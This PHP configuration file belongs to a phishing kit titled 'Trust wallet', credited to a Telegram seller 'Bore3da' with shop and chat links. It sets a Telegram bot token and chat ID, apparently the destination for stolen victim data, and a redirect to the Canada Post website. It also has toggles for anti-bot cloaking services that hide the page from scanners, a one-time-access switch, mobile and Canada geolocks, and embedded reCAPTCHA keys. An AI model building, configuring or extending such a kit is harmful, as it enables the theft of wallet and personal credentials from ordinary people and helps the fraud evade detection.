<?php 
/**

 * Group Chat   :   https://t.me/bore3da_chat 
 * @telegram   :   @Bore3da 
 * Project Name:   Trust wallet
 * Author      :   Bore3da
 * channel Telegram  :  https://t.me/bore3dashop
 */
// require_once 'includes/main.php';

$bot_token = ""; // Your Bot Api Key
$chat_ids = ""; //Chat ID of you


$ExitLink = "https://www.canadapost-postescanada.ca/cpc/en/home.page";


// some blockers

$One_Time_Access = 1; //1 for enable and 0 for disable

$internal_antibot = 1;

$enable_killbot = 0; // this one uses killbot.org blocker // 1 to enable and 0 to disable
$killbot_key = ''; // external blocker api key u get from here after u topup your balance https://killbot.org/developer [ required if killbot.org is enabled ]

$external_antibot = 0; // this one uses antibot.pw blocker // 1 to enable and 0 to disable
$apikey = ''; // external blocker api key u get from here after u topup your balance https://antibot.pw/dashboard/developers [ required if antibot.pw is enabled ]

$mobile_lock = 0; // 1 to enable and 0 to disable
$CA_lock = 0;  //1 for enable and 0 for disable (free api may not be accurate)


//recaptcha settings captcha v2
$enable_captcha = 0;
$site_key = '6LflNagpAAAAAFDLz6PwVjfboRkLx_dLKVMYaMfG';
$secret_key = '6LflNagpAAAAAAigx_BcbIFbKHU0v1nAndkFtCgc';

?>